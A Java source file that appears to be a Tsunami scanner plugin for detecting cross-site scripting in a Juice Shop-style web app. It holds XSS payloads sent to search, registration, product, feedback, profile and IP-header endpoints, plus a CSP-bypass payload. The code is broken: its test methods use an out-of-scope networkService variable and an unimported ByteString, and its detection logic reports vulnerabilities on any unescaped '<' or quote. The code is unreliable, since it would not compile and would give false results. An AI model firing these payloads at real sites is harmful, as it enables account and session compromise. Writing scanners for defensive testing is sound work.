/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XssdetectorpluginDetector",
    version = "0.1",
    description = "Detects XssDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = XssdetectorpluginDetectorBootstrapModule.class)
public final class XssdetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public XssdetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Xssdetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String baseUrl = buildTargetUrl(networkService);
    boolean vulnerabilityFound = false;
    
    try {
        // Test DOM XSS via search parameter
        vulnerabilityFound |= testDomXss(baseUrl);
        
        // Test reflected XSS via track-result parameter
        vulnerabilityFound |= testReflectedXss(baseUrl);
        
        // Test stored XSS via user registration
        vulnerabilityFound |= testStoredXssUsers(baseUrl);
        
        // Test stored XSS via product creation
        vulnerabilityFound |= testStoredXssProducts(baseUrl);
        
        // Test XSS via profile update
        vulnerabilityFound |= testProfileXss(baseUrl);
        
        // Test XSS via contact form
        vulnerabilityFound |= testContactXss(baseUrl);
        
        // Test XSS via HTTP headers
        vulnerabilityFound |= testHeaderXss(baseUrl);
        
        // Test CSP bypass
        vulnerabilityFound |= testCspBypass(baseUrl);
        
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error during XSS vulnerability detection");
    }
    
    return vulnerabilityFound;
}

private boolean testDomXss(String baseUrl) {
    try {
        String[] domPayloads = {
            "<iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')"
        };
        
        for (String payload : domPayloads) {
            String searchUrl = baseUrl + "/search?q=" + urlEncode(payload);
            HttpRequest request = HttpRequest.get(searchUrl).withEmptyHeaders().build();
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess() && containsXssIndicators(response.bodyString().orElse(""), payload)) {
                return true;
            }
            
            // Also test hash-based routing
            String hashUrl = baseUrl + "/#/search?q=" + urlEncode(payload);
            request = HttpRequest.get(hashUrl).withEmptyHeaders().build();
            response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess() && containsXssIndicators(response.bodyString().orElse(""), payload)) {
                return true;
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing DOM XSS");
    }
    return false;
}

private boolean testReflectedXss(String baseUrl) {
    try {
        String[] reflectedPayloads = {
            "<iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<svg onload=alert('xss')>",
            "\"onmouseover=alert('xss')"
        };
        
        for (String payload : reflectedPayloads) {
            String trackUrl = baseUrl + "/#/track-result?id=" + urlEncode(payload);
            HttpRequest request = HttpRequest.get(trackUrl).withEmptyHeaders().build();
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess() && containsXssIndicators(response.bodyString().orElse(""), payload)) {
                return true;
            }
            
            // Test other common reflected XSS parameters
            String[] params = {"search", "q", "query", "term", "keyword", "name", "value"};
            for (String param : params) {
                String paramUrl = baseUrl + "/search?" + param + "=" + urlEncode(payload);
                request = HttpRequest.get(paramUrl).withEmptyHeaders().build();
                response = httpClient.send(request, networkService);
                
                if (response.status().isSuccess() && containsXssIndicators(response.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing reflected XSS");
    }
    return false;
}

private boolean testStoredXssUsers(String baseUrl) {
    try {
        String[] storedPayloads = {
            "<iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        };
        
        for (String payload : storedPayloads) {
            String userPayload = "{\"email\": \"" + payload + "\", \"password\": \"xss\"}";
            
            HttpRequest request = HttpRequest.post(baseUrl + "/api/Users")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/json")
                    .build())
                .setRequestBody(ByteString.copyFromUtf8(userPayload))
                .build();
                
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess()) {
                // Check if payload is stored by visiting admin page
                HttpRequest adminRequest = HttpRequest.get(baseUrl + "/#/administration").withEmptyHeaders().build();
                HttpResponse adminResponse = httpClient.send(adminRequest, networkService);
                
                if (adminResponse.status().isSuccess() && containsXssIndicators(adminResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing stored XSS via users");
    }
    return false;
}

private boolean testStoredXssProducts(String baseUrl) {
    try {
        String[] storedPayloads = {
            "<iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        };
        
        for (String payload : storedPayloads) {
            String productPayload = "{\"name\": \"XSS\", \"description\": \"" + payload + "\", \"price\": 47.11}";
            
            HttpRequest request = HttpRequest.post(baseUrl + "/api/Products")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/json")
                    .addHeader("Authorization", "Bearer test-token")
                    .build())
                .setRequestBody(ByteString.copyFromUtf8(productPayload))
                .build();
                
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess()) {
                // Check if payload is stored by visiting search page
                HttpRequest searchRequest = HttpRequest.get(baseUrl + "/#/search").withEmptyHeaders().build();
                HttpResponse searchResponse = httpClient.send(searchRequest, networkService);
                
                if (searchResponse.status().isSuccess() && containsXssIndicators(searchResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing stored XSS via products");
    }
    return false;
}

private boolean testProfileXss(String baseUrl) {
    try {
        String[] profilePayloads = {
            "<script>alert('xss')</script>",
            "<<a|ascript>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        };
        
        for (String payload : profilePayloads) {
            String profileData = "username=" + urlEncode(payload) + "&imageUrl=http://test.com/image.png";
            
            HttpRequest request = HttpRequest.post(baseUrl + "/profile")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/x-www-form-urlencoded")
                    .build())
                .setRequestBody(ByteString.copyFromUtf8(profileData))
                .build();
                
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess()) {
                // Check profile page for XSS
                HttpRequest profileRequest = HttpRequest.get(baseUrl + "/profile").withEmptyHeaders().build();
                HttpResponse profileResponse = httpClient.send(profileRequest, networkService);
                
                if (profileResponse.status().isSuccess() && containsXssIndicators(profileResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing profile XSS");
    }
    return false;
}

private boolean testContactXss(String baseUrl) {
    try {
        String[] contactPayloads = {
            "<<script>Foo</script>iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<iframe src=\"javascript:alert('xss')\">"
        };
        
        for (String payload : contactPayloads) {
            String contactData = "{\"comment\": \"" + payload + "\", \"rating\": 5}";
            
            HttpRequest request = HttpRequest.post(baseUrl + "/api/Feedbacks")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/json")
                    .build())
                .setRequestBody(ByteString.copyFromUtf8(contactData))
                .build();
                
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess()) {
                // Check about page for stored XSS
                HttpRequest aboutRequest = HttpRequest.get(baseUrl + "/#/about").withEmptyHeaders().build();
                HttpResponse aboutResponse = httpClient.send(aboutRequest, networkService);
                
                if (aboutResponse.status().isSuccess() && containsXssIndicators(aboutResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
                
                // Check administration page for stored XSS
                HttpRequest adminRequest = HttpRequest.get(baseUrl + "/#/administration").withEmptyHeaders().build();
                HttpResponse adminResponse = httpClient.send(adminRequest, networkService);
                
                if (adminResponse.status().isSuccess() && containsXssIndicators(adminResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing contact XSS");
    }
    return false;
}

private boolean testHeaderXss(String baseUrl) {
    try {
        String[] headerPayloads = {
            "<iframe src=\"javascript:alert('xss')\">",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        };
        
        for (String payload : headerPayloads) {
            HttpRequest request = HttpRequest.post(baseUrl + "/rest/saveLoginIp")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/json")
                    .addHeader("True-Client-IP", payload)
                    .addHeader("X-Forwarded-For", payload)
                    .addHeader("X-Real-IP", payload)
                    .build())
                .setRequestBody(ByteString.copyFromUtf8("{}"))
                .build();
                
            HttpResponse response = httpClient.send(request, networkService);
            
            if (response.status().isSuccess()) {
                // Check last login IP page
                HttpRequest ipRequest = HttpRequest.get(baseUrl + "/#/privacy-security/last-login-ip").withEmptyHeaders().build();
                HttpResponse ipResponse = httpClient.send(ipRequest, networkService);
                
                if (ipResponse.status().isSuccess() && containsXssIndicators(ipResponse.bodyString().orElse(""), payload)) {
                    return true;
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing header XSS");
    }
    return false;
}

private boolean testCspBypass(String baseUrl) {
    try {
        String cspBypassPayload = "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com";
        String usernamePayload = "<<a|ascript>alert('xss')</script>";
        
        // First set malicious image URL to bypass CSP
        String profileData = "username=test&imageUrl=" + urlEncode(cspBypassPayload);
        
        HttpRequest cspRequest = HttpRequest.post(baseUrl + "/profile")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(profileData))
            .build();
            
        HttpResponse cspResponse = httpClient.send(cspRequest, networkService);
        
        if (cspResponse.status().isSuccess()) {
            // Then set malicious username
            String usernameData = "username=" + urlEncode(usernamePayload) + "&imageUrl=" + urlEncode(cspBypassPayload);
            
            HttpRequest usernameRequest = HttpRequest.post(baseUrl + "/profile")
                .setHeaders(HttpHeaders.builder()
                    .addHeader("Content-Type", "application/x-www-form-urlencoded")
                    .build())
                .setRequestBody(ByteString.copyFromUtf8(usernameData))
                .build();
                
            HttpResponse usernameResponse = httpClient.send(usernameRequest, networkService);
            
            if (usernameResponse.status().isSuccess()) {
                // Check if CSP bypass worked
                HttpRequest profileRequest = HttpRequest.get(baseUrl + "/profile").withEmptyHeaders().build();
                HttpResponse profileResponse = httpClient.send(profileRequest, networkService);
                
                if (profileResponse.status().isSuccess()) {
                    String responseBody = profileResponse.bodyString().orElse("");
                    return containsXssIndicators(responseBody, "<script>alert('xss')</script>") ||
                           responseBody.contains("script-src 'unsafe-inline'");
                }
            }
        }
    } catch (Exception e) {
        logger.atWarning().withCause(e).log("Error testing CSP bypass");
    }
    return false;
}

private boolean containsXssIndicators(String response, String payload) {
    if (response == null || payload == null) {
        return false;
    }
    
    String lowerResponse = response.toLowerCase();
    String lowerPayload = payload.toLowerCase();
    
    // Check if payload is reflected unescaped
    if (lowerResponse.contains(lowerPayload)) {
        return true;
    }
    
    // Check for common XSS indicators
    String[] xssIndicators = {
        "<script",
        "javascript:",
        "onerror=",
        "onload=",
        "onmouseover=",
        "<iframe",
        "<img",
        "<svg",
        "alert(",
        "eval(",
        "document.cookie",
        "window.location"
    };
    
    for (String indicator : xssIndicators) {
        if (lowerResponse.contains(indicator) && lowerResponse.contains("xss")) {
            return true;
        }
    }
    
    // Check for HTML context breaks
    if (payload.contains("<") && response.contains("<") && 
        !response.contains("&lt;") && !response.contains("&#60;")) {
        return true;
    }
    
    // Check for JavaScript context breaks
    if (payload.contains("'") && response.contains("'") && 
        !response.contains("&#39;") && !response.contains("&apos;")) {
        return true;
    }
    
    return false;
}

private String urlEncode(String value) {
    try {
        return java.net.URLEncoder.encode(value, "UTF-8");
    } catch (Exception e) {
        return value;
    }
}

private String buildTargetUrl(NetworkService networkService) {
    return (networkService.getNetworkEndpoint().getForceHttps() ? "https://" : "http://") +
           networkService.getNetworkEndpoint().getHostname().name() + ":" +
           networkService.getNetworkEndpoint().getPort().getPortNumber();
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("XSSDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("XssDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to XssDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper input validation, output encoding, Content Security Policy (CSP), and use secure coding practices to prevent XSS attacks. Sanitize all user inputs and encode outputs appropriately for the context."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("XSSDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("XssDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to XssDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper input validation, output encoding, Content Security Policy (CSP), and use secure coding practices to prevent XSS attacks. Sanitize all user inputs and encode outputs appropriately for the context.")
        .build());
  }
}